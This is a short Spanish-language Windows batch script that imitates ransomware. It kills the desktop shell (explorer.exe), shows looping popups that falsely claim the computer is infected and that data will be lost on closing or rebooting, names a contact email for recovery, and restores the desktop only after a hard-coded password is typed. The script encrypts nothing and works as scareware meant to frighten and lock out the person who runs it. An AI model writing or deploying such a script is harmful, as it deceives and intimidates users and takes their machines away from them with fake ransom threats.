color 0A
@echo off 
title TE HE HACKEADO
taskkill /f /im explorer.exe 
:bucle 
cls               
msg * lEEA CON ATENCION USTED HA SIDO INFECTADO CON UN "RANSOMWARE", SI USTED CIERRA LA VENTANA O REINICIA EL EQUIPO, SE PERDERAN SUS DATOS.Si quiere recuperar sus datos contacte con:peco20191@outlook.com
msg * urweiurweuriweurweuriweriweurweuriweurewurweiriewuri
echo =============================================
echo Para recuperar su computadora ingrese
echo =============================================
echo La contraseña del correo
echo =============================================
set /p pass=TEXTO: 
if %pass%==10/13/8676 (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Felicidades!
start explorer.exe 
pause
exit